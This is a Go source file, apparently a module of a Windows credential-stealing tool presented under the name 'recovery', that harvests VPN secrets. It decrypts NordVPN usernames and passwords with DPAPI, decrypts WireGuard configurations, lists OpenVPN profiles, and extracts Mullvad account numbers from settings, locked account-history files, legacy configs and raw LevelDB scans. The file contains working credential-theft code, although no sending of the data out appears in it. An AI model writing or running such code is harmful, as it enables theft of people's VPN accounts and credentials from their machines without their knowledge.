//go:build windows

package recovery

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/platform"
	"recovery/recovery/types"
)

func ScanVPNs() *types.VPNResult {
	result := &types.VPNResult{
		NordVPN:   scanNordVPN(),
		WireGuard: scanWireGuard(),
		OpenVPN:   scanOpenVPN(),
		Mullvad:   scanMullvad(),
	}
	if len(result.NordVPN) == 0 && len(result.WireGuard) == 0 && len(result.OpenVPN) == 0 && len(result.Mullvad) == 0 {
		return nil
	}
	return result
}

func scanNordVPN() []types.NordVPNResult {
	var results []types.NordVPNResult

	nordDir := filepath.Join(os.Getenv("LOCALAPPDATA"), "NordVPN")
	logf("[vpn] NordVPN dir=%q exists=%v", nordDir, pathExists(nordDir))
	if !pathExists(nordDir) {
		return nil
	}

	entries, err := os.ReadDir(nordDir)
	if err != nil {
		return nil
	}

	for _, e := range entries {
		if !e.IsDir() || !strings.Contains(e.Name(), "NordVpn.exe") {
			continue
		}

		versionsDir := filepath.Join(nordDir, e.Name())
		subEntries, _ := os.ReadDir(versionsDir)

		for _, sub := range subEntries {
			if !sub.IsDir() {
				continue
			}
			configPath := filepath.Join(versionsDir, sub.Name(), "user.config")
			if !pathExists(configPath) {
				continue
			}

			data, err := os.ReadFile(configPath)
			if err != nil || len(data) == 0 {
				continue
			}

			username := extractNordVPNValue(data, "Username")
			password := extractNordVPNValue(data, "Password")

			if username != "" && password != "" {
				results = append(results, types.NordVPNResult{
					Version:  e.Name(),
					Username: username,
					Password: password,
				})
			}
		}
	}

	return results
}

func extractNordVPNValue(data []byte, field string) string {
	content := string(data)
	idx := strings.Index(content, `name="`+field+`"`)
	if idx == -1 {
		return ""
	}

	start := strings.Index(content[idx:], "<value>")
	end := strings.Index(content[idx:], "</value>")
	if start == -1 || end == -1 || end < start {
		return ""
	}

	raw := content[idx+start+7 : idx+end]
	decoded, err := base64.StdEncoding.DecodeString(raw)
	if err != nil {
		return raw
	}

	plaintext, err := dpapiDecrypt(decoded, nil)
	if err != nil || len(plaintext) == 0 {
		return raw
	}

	return strings.TrimRight(string(plaintext), "\x00")
}

func scanWireGuard() []types.WireGuardResult {
	var results []types.WireGuardResult

	configDirs := []string{
		`C:\Program Files\WireGuard\Data\Configurations`,
		filepath.Join(os.Getenv("LOCALAPPDATA"), "WireGuard", "Configurations"),
	}

	for _, configDir := range configDirs {
		logf("[vpn] WireGuard config dir=%q exists=%v", configDir, pathExists(configDir))
		if !pathExists(configDir) {
			continue
		}

		entries, err := os.ReadDir(configDir)
		if err != nil {
			continue
		}
		logf("[vpn] WireGuard dir has %d entries", len(entries))

		for _, e := range entries {
			if e.IsDir() {
				continue
			}

			name := e.Name()
			ext := strings.ToLower(filepath.Ext(name))
			filePath := filepath.Join(configDir, name)

			var confData []byte

			if ext == ".dpapi" {
				confData, err = dpapiDecryptFile(filePath)
				name = strings.TrimSuffix(name, ".dpapi")
			} else if ext == ".conf" {
				confData, err = os.ReadFile(filePath)
			} else {
				continue
			}

			if err != nil || len(confData) == 0 {
				continue
			}

			var iface, peer, endpoint string
			for _, line := range normLines(string(confData)) {
				line = strings.TrimSpace(line)
				if key, val, ok := strings.Cut(line, "="); ok {
					key = strings.TrimSpace(key)
					val = strings.TrimSpace(val)
					switch key {
					case "Address":
						iface = val
					case "Endpoint":
						endpoint = val
					case "PublicKey":
						if peer == "" {
							peer = val
						}
					}
				}
			}

			results = append(results, types.WireGuardResult{
				Name:      name,
				Interface: iface,
				Peer:      peer,
				Endpoint:  endpoint,
			})
		}
	}

	return results
}

func dpapiDecryptFile(path string) ([]byte, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	return dpapiDecrypt(data, nil)
}

func scanOpenVPN() []types.OpenVPNResult {
	var results []types.OpenVPNResult

	ovpnDirs := []string{
		filepath.Join(os.Getenv("APPDATA"), "OpenVPN Connect", "profiles"),
		filepath.Join(os.Getenv("USERPROFILE"), "OpenVPN", "config"),
	}

	for _, ovpnDir := range ovpnDirs {
		logf("[vpn] OpenVPN dir=%q exists=%v", ovpnDir, pathExists(ovpnDir))
		if !pathExists(ovpnDir) {
			continue
		}

		entries, err := os.ReadDir(ovpnDir)
		if err != nil {
			continue
		}
		logf("[vpn] OpenVPN dir has %d entries", len(entries))

		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".ovpn") {
				continue
			}
			results = append(results, types.OpenVPNResult{
				Name: e.Name(),
				Path: filepath.Join(ovpnDir, e.Name()),
			})
		}
	}

	return results
}

func scanMullvad() []types.MullvadResult {
	var results []types.MullvadResult

	mullvadPids, _ := platform.FindProcesses("mullvad-daemon.exe")

	systemProfile := `C:\Windows\System32\config\systemprofile\AppData\Local\Mullvad VPN`
	logf("[vpn] Mullvad SYSTEM profile=%q exists=%v", systemProfile, pathExists(systemProfile))
	if pathExists(systemProfile) {
		sysSettings := filepath.Join(systemProfile, "settings.json")
		logf("[vpn] Mullvad SYSTEM settings.json=%q exists=%v", sysSettings, pathExists(sysSettings))
		mullvadTryJSON(&results, sysSettings)

		sysAcctHistory := filepath.Join(systemProfile, "account-history.json")
		logf("[vpn] Mullvad SYSTEM account-history=%q exists=%v", sysAcctHistory, pathExists(sysAcctHistory))
		mullvadReadAccountHistory(&results, sysAcctHistory, mullvadPids)
	}

	daemonSettings := filepath.Join(os.Getenv("LOCALAPPDATA"), "Mullvad VPN", "settings.json")
	logf("[vpn] Mullvad daemon settings=%q exists=%v", daemonSettings, pathExists(daemonSettings))
	mullvadTryJSON(&results, daemonSettings)

	guiDir := filepath.Join(os.Getenv("APPDATA"), "Mullvad VPN")
	logf("[vpn] Mullvad GUI dir=%q exists=%v", guiDir, pathExists(guiDir))
	if pathExists(guiDir) {
		guiSettings := filepath.Join(guiDir, "gui_settings.json")
		logf("[vpn] Mullvad gui_settings.json=%q exists=%v", guiSettings, pathExists(guiSettings))
		mullvadTryJSON(&results, guiSettings)

		lsDir := filepath.Join(guiDir, "Local Storage", "leveldb")
		logf("[vpn] Mullvad Local Storage=%q exists=%v", lsDir, pathExists(lsDir))
		if pathExists(lsDir) {
			mullvadScanLevelDB(&results, lsDir, guiDir)
		}
	}

	acctHistory := filepath.Join(os.Getenv("LOCALAPPDATA"), "Mullvad VPN", "account-history.json")
	logf("[vpn] Mullvad account-history=%q exists=%v", acctHistory, pathExists(acctHistory))
	mullvadReadAccountHistory(&results, acctHistory, mullvadPids)

	legacyPath := `C:\Program Files\Mullvad VPN\Configs\Mullvad`
	logf("[vpn] Mullvad legacy=%q exists=%v", legacyPath, pathExists(legacyPath))
	if pathExists(legacyPath) {
		if data, err := os.ReadFile(legacyPath); err == nil && len(data) > 0 {
			var account string
			if decrypted, err := dpapiDecrypt(data, nil); err == nil && len(decrypted) > 0 {
				account = strings.TrimRight(string(decrypted), "\x00")
			}
			if account == "" {
				for _, line := range normLines(strings.TrimSpace(string(data))) {
					line = strings.TrimSpace(line)
					if line != "" {
						account = line
						break
					}
				}
			}
			if account != "" && !mullvadAlreadyFound(results, account) {
				results = append(results, types.MullvadResult{AccountNumber: account, SettingsPath: legacyPath})
			}
		}
	}

	return results
}

func mullvadTryJSON(results *[]types.MullvadResult, path string) {
	if !pathExists(path) {
		return
	}
	data, err := os.ReadFile(path)
	if err != nil || len(data) == 0 {
		return
	}
	var raw map[string]json.RawMessage
	if json.Unmarshal(data, &raw) != nil {
		return
	}
	for _, key := range []string{"account_token", "accountToken", "account_number", "account"} {
		v, ok := raw[key]
		if !ok {
			continue
		}
		var token string
		if json.Unmarshal(v, &token) == nil && token != "" {
			logf("[vpn] Mullvad found token via key %q in %s", key, path)
			if !mullvadAlreadyFound(*results, token) {
				*results = append(*results, types.MullvadResult{AccountNumber: token, SettingsPath: path})
			}
			return
		}
	}
}

func mullvadReadAccountHistory(results *[]types.MullvadResult, path string, pids []uint32) {
	if !pathExists(path) {
		return
	}
	data, err := platform.ReadLockedFile(path, pids)
	if err != nil || len(data) == 0 {
		logf("[vpn] Mullvad ReadLockedFile %q failed: %v", path, err)
		return
	}
	rawContent := strings.TrimSpace(string(data))
	logf("[vpn] Mullvad account-history content (%d bytes) from %s", len(data), path)

	var token string
	if json.Unmarshal(data, &token) == nil && token != "" && !mullvadAlreadyFound(*results, token) {
		*results = append(*results, types.MullvadResult{AccountNumber: token, SettingsPath: path, Content: rawContent})
	}
	var tokens []string
	if json.Unmarshal(data, &tokens) == nil {
		for _, t := range tokens {
			if t != "" && !mullvadAlreadyFound(*results, t) {
				*results = append(*results, types.MullvadResult{AccountNumber: t, SettingsPath: path, Content: rawContent})
			}
		}
	}
}

func mullvadScanLevelDB(results *[]types.MullvadResult, lsDir, sourceDir string) {
	entries, err := os.ReadDir(lsDir)
	if err != nil {
		return
	}
	for _, e := range entries {
		ext := strings.ToLower(filepath.Ext(e.Name()))
		if ext != ".log" && ext != ".ldb" {
			continue
		}
		data, err := os.ReadFile(filepath.Join(lsDir, e.Name()))
		if err != nil || len(data) == 0 {
			continue
		}
		content := string(data)
		// Mullvad account numbers are 16 decimal digits
		for i := 0; i <= len(content)-16; i++ {
			if isDigit(content[i]) {
				end := i
				for end < len(content) && isDigit(content[end]) {
					end++
				}
				seq := content[i:end]
				if len(seq) == 16 {
					logf("[vpn] Mullvad found 16-digit token in leveldb %s", e.Name())
					if !mullvadAlreadyFound(*results, seq) {
						*results = append(*results, types.MullvadResult{AccountNumber: seq, SettingsPath: sourceDir})
					}
				}
				i = end
			}
		}
	}
}

func isDigit(c byte) bool {
	return c >= '0' && c <= '9'
}

func mullvadAlreadyFound(results []types.MullvadResult, account string) bool {
	for _, r := range results {
		if r.AccountNumber == account {
			return true
		}
	}
	return false
}
